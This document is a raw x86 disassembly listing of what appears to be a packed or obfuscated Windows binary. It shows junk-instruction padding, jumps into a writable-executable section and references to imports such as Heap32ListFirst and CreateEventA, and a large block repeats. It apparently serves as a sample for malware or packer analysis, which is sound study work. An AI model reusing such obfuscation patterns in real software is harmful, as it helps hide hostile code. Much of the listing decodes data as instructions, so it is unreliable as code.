cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_5156a9
push 0x3fc933fa
jmp rwxdata
lea esp [ esp + 0x8 ]
jne rwxdata
jpe rwxdata
push ecx
pushad
mov [ esp ] 0xd5
stosb [ edi ]
push 0x9c150d40
mov [ esp ] sp
push edi
lea esp [ esp + 0x2c ]
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
